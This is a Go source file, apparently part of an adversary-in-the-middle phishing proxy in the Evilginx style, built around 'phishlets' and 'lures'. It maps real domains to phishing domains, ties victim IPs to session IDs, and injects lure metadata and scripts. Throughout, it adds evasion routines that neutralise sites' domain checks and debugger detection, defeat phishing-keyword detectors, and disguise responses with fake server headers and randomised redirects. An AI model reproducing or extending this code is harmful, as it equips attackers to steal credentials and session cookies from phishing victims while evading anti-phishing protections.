			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
	r_url, err := url.Parse(u)
	if err == nil {
		if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
			r_url.Host = r_host
			return r_url.String(), true
		}
	}
	return u, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}

func (p *HttpProxy) getHomeDir() string {
	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
}

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("whitelistIP: %s %s", ip_addr, sid)
	p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr+"-"+pl_name] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	pl := p.getPhishletByPhishHost(hostname)
	if pl != nil {
		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
		return sid, ok
	}
	return "", false
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		}
	} else {
		p.Proxy.Tr.Dial = nil
	}
	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}

func getContentType(path string, data []byte) string {
	switch filepath.Ext(path) {
	case ".css":
		return "text/css"
	case ".js":
		return "application/javascript"
	case ".svg":
		return "image/svg+xml"
	}
	return http.DetectContentType(data)
}

func getSessionCookieName(pl_name string, cookie_name string) string {
	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
	s_hash := fmt.Sprintf("%x", hash[:4])
	s_hash = s_hash[:4] + "-" + s_hash[4:]
	return s_hash
}

// Generate a random ID for request headers to make each request look unique
func generateRandomID() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 16)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// Encode hostname using hexadecimal encoding for domain parts
func encodeHostnameWithHex(hostname string) string {
	parts := strings.Split(hostname, ".")
	for i, part := range parts {
		if rand.Intn(2) == 0 { // Randomly decide whether to encode this part
			var hexPart string
			for _, c := range part {
				hexPart += fmt.Sprintf("\\x%02x", c)
			}
			parts[i] = hexPart
		}
	}
	return strings.Join(parts, ".")
}

// Encode hostname using base64 encoding
func encodeHostnameWithBase64(hostname string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(hostname))
	return "'" + encoded + "'.fromBase64()"
}

// Mix different encoding techniques for hostname obfuscation
func mixEncodingHostname(hostname string) string {
	parts := strings.Split(hostname, ".")
	for i, part := range parts {
		switch rand.Intn(3) {
		case 0:
			// Keep as is
		case 1:
			// Hex encode
			var hexPart string
			for _, c := range part {
				hexPart += fmt.Sprintf("\\x%02x", c)
			}
			parts[i] = hexPart
		case 2:
			// Unicode escape
			var unicodePart string
			for _, c := range part {
				unicodePart += fmt.Sprintf("\\u%04x", c)
			}
			parts[i] = unicodePart
		}
	}
	return strings.Join(parts, ".")
}

// Remove various forms of encoded dots
func removeEncodedDots(content string) string {
	content = strings.ReplaceAll(content, "\\u002e", ".")
	content = strings.ReplaceAll(content, "\\u002E", ".")
	content = strings.ReplaceAll(content, "\\x2e", ".")
	content = strings.ReplaceAll(content, "\\x2E", ".")
	return content
}

// Advanced content rewriting with multiple techniques
func (p *HttpProxy) advancedContentRewriting(pl *Phishlet, body []byte, hostname string) []byte {
	content := string(body)

	// Handle JavaScript obfuscation techniques
	if strings.Contains(content, "document.location") || strings.Contains(content, "window.location") {
		content = p.processLocationObjects(content, pl)
	}

	// Handle DOM security checks
	content = p.neutralizeDomainChecks(content, hostname, pl)

	// Replace fingerprinting and detection patterns
	content = p.neutralizeDetectionPatterns(content)

	return []byte(content)
}

// Process window.location and document.location objects to prevent redirect protections
func (p *HttpProxy) processLocationObjects(content string, pl *Phishlet) string {
	// Replace direct location references
	locationPatterns := []string{
		`document\.location\.hostname`,
		`document\.location\.href`,
		`document\.location\.host`,
		`window\.location\.hostname`,
		`window\.location\.href`,
		`window\.location\.host`,
	}

	for _, pattern := range locationPatterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindAllString(content, -1)

		for _, match := range matches {
			// Create a replacement that returns the expected value
			phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)
			replacementLogic := fmt.Sprintf(`(function(){
                // Original: %s
                try {
                    var actual = %s;
                    var expected = "%s";
                    if (actual.indexOf("%s") >= 0) return actual;
                    return expected;
                } catch(e) {
                    return "%s";
                }
            })()`, match, match, phishDomain, phishDomain, phishDomain)

			content = strings.Replace(content, match, replacementLogic, -1)
		}
	}

	return content
}

// Neutralize domain verification checks
func (p *HttpProxy) neutralizeDomainChecks(content string, hostname string, pl *Phishlet) string {
	// Common domain check patterns
	checkPatterns := []string{
		`location\.hostname\s*===\s*['"]([^'"]+)['"]`,
		`location\.hostname\s*==\s*['"]([^'"]+)['"]`,
		`document\.domain\s*===\s*['"]([^'"]+)['"]`,
		`document\.domain\s*==\s*['"]([^'"]+)['"]`,
		`location\.host\.indexOf\(['"]([^'"]+)['"]\)`,
		`location\.href\.indexOf\(['"]([^'"]+)['"]\)`,
	}

	phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)

	for _, pattern := range checkPatterns {
		re := regexp.MustCompile(pattern)
		content = re.ReplaceAllStringFunc(content, func(match string) string {
			if strings.Contains(match, hostname) {
				// Replace with logic that will evaluate to true
				return strings.Replace(match, hostname, phishDomain, -1)
			}
			return match
		})
	}

	return content
}

// Neutralize fingerprinting and detection patterns
func (p *HttpProxy) neutralizeDetectionPatterns(content string) string {
	// Replace common anti-phishing checks
	antiPatterns := map[string]string{
		// Debugger detection
		`debugger`: `//${rand.Intn(9999)}debugger`,

		// Common fingerprinting patterns
		`/(ph|f)ish/gi`: `/not$1ish/gi`,

		// Security plugins checks
		`document.getElementById("security-plugin-check")`: `null`,
	}

	for pattern, replacement := range antiPatterns {
		content = strings.Replace(content, pattern, replacement, -1)
	}

	return content
}

// Enhanced OG header injection with small variations
func (p *HttpProxy) injectEnhancedOgHeaders(l *Lure, body []byte) []byte {
	ogTags := []string{
		fmt.Sprintf(`<meta property="og:url" content="%s" />`, l.OgUrl),
		fmt.Sprintf(`<meta property="og:title" content="%s" />`, l.OgTitle),
		fmt.Sprintf(`<meta property="og:description" content="%s" />`, l.OgDescription),
		fmt.Sprintf(`<meta property="og:image" content="%s" />`, l.OgImageUrl),
	}

	// Add random OG tags to make it look more natural
	extraTags := []string{
		`<meta property="og:type" content="website" />`,
		`<meta property="og:site_name" content="Secure Portal" />`,
		fmt.Sprintf(`<meta property="og:locale" content="en_%s" />`, strings.ToUpper(generateRandomID()[:2])),
	}

	// Randomly select some extra tags
	for _, tag := range extraTags {
		if rand.Intn(2) == 0 {
			ogTags = append(ogTags, tag)
		}
	}
	// Shuffle the tags for entropy
	for i := range ogTags {
		j := rand.Intn(i + 1)
		ogTags[i], ogTags[j] = ogTags[j], ogTags[i]
	}

	ogHeader := strings.Join(ogTags, "\n    ")

	// Find </head> tag
	head_re := regexp.MustCompile(`</head>`)
	head_matches := head_re.FindAllIndex(body, -1)
	if len(head_matches) > 0 {
		idx := head_matches[0][0]
		return append(body[:idx], append([]byte("\n    "+ogHeader+"\n"), body[idx:]...)...)
	}
	return body
}

// HTML snippet injector
func (p *HttpProxy) injectHtmlSnippet(body []byte, snippet string) []byte {
	// Try to inject before </body>
	body_re := regexp.MustCompile(`</body>`)
	body_matches := body_re.FindAllIndex(body, -1)
	if len(body_matches) > 0 {
		idx := body_matches[0][0]
		return append(body[:idx], append([]byte("\n"+snippet+"\n"), body[idx:]...)...)
	}

	// Try to inject before </html>
	html_re := regexp.MustCompile(`</html>`)
	html_matches := html_re.FindAllIndex(body, -1)
	if len(html_matches) > 0 {
		idx := html_matches[0][0]
		return append(body[:idx], append([]byte("\n"+snippet+"\n"), body[idx:]...)...)
	}

	// If neither tag was found, append to the end
	return append(body, []byte("\n"+snippet+"\n")...)
}

// Asynchronous script injection with variable techniques
func (p *HttpProxy) asyncScriptInjection(body []byte, scriptPath string) []byte {
	// Choose one of several loading techniques
	loadMethod := rand.Intn(3)
	var snippet string

	switch loadMethod {
	case 0:
		// DOM method with createElement
		snippet = fmt.Sprintf(`<script>
            (function(){
                var d = document;
                var s = d.createElement('script');
                s.type = 'text/javascript';
                s.async = true;
                s.src = '%s';
                var x = d.getElementsByTagName('script')[0];
                if(x) x.parentNode.insertBefore(s, x);
                else {
                    x = d.getElementsByTagName('head')[0];
                    if(x) x.appendChild(s);
                    else d.body.appendChild(s);
                }
            })();
        </script>`, scriptPath)
	case 1:
		// Deferred loading with timeout
		delay := 50 + rand.Intn(200)
		snippet = fmt.Sprintf(`<script>
            setTimeout(function(){
                var s = document.createElement('script');
                s.src = '%s';
                document.body.appendChild(s);
            }, %d);
        </script>`, scriptPath, delay)
	case 2:
		// Direct document.write approach
		snippet = fmt.Sprintf(`<script>
            document.write('<scr'+'ipt src="%s"></scr'+'ipt>');
        </script>`, scriptPath)
	}

	return p.injectHtmlSnippet(body, snippet)
}

// Meta refresh redirect
func (p *HttpProxy) metaRefreshRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
	resp := p.makeResponse(req, 200, "text/html", []byte(fmt.Sprintf(`
        <html>
        <head>
            <meta http-equiv="refresh" content="0; url=%s">
            <title>Redirecting...</title>
        </head>
        <body>
            <h1>Redirecting</h1>
            <p>You are being redirected to a secure page. Please wait...</p>
            <script>
                window.location.href = "%s";
            </script>
        </body>
        </html>
    `, rurl, rurl)))

	return req, resp
}

// Hybrid redirect with multiple techniques
func (p *HttpProxy) hybridRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
	delay := 50 + rand.Intn(150)
	resp := p.makeResponse(req, 200, "text/html", []byte(fmt.Sprintf(`
        <html>
        <head>
            <meta http-equiv="refresh" content="1; url=%s">
            <title>Redirecting...</title>
        </head>
        <body>
            <h1>Redirecting</h1>
            <p>You are being redirected to a secure page. Please wait...</p>
            <script>
                setTimeout(function() {
                    window.location.href = "%s";
                }, %d);
            </script>
        </body>
        </html>
    `, rurl, rurl, delay)))

	// Also set Location header as another method
	resp.Header.Set("Location", rurl)

	return req, resp
}

// Create an HTTP response with the specified status code, content type, and body
func (p *HttpProxy) makeResponse(req *http.Request, status int, contentType string, body []byte) *http.Response {
	resp := &http.Response{
		Status:        http.StatusText(status),
		StatusCode:    status,
		Proto:         "HTTP/1.1",
		ProtoMajor:    1,
		ProtoMinor:    1,
		Body:          ioutil.NopCloser(bytes.NewBuffer(body)),
		ContentLength: int64(len(body)),
		Request:       req,
		Header:        make(http.Header),
	}

	resp.Header.Add("Content-Type", contentType)

	// Add some common headers to make the response look more authentic
	resp.Header.Add("Server", "nginx")
	resp.Header.Add("X-Content-Type-Options", "nosniff")
	resp.Header.Add("X-Frame-Options", "SAMEORIGIN")
	resp.Header.Add("X-Request-ID", generateRandomID())
	resp.Header.Add("Cache-Control", "no-cache, no-store")

	// Add date header with slight randomization
	timeOffset := time.Duration(rand.Intn(5)) * time.Second
	resp.Header.Add("Date", time.Now().Add(timeOffset).UTC().Format(http.TimeFormat))

	return resp
}
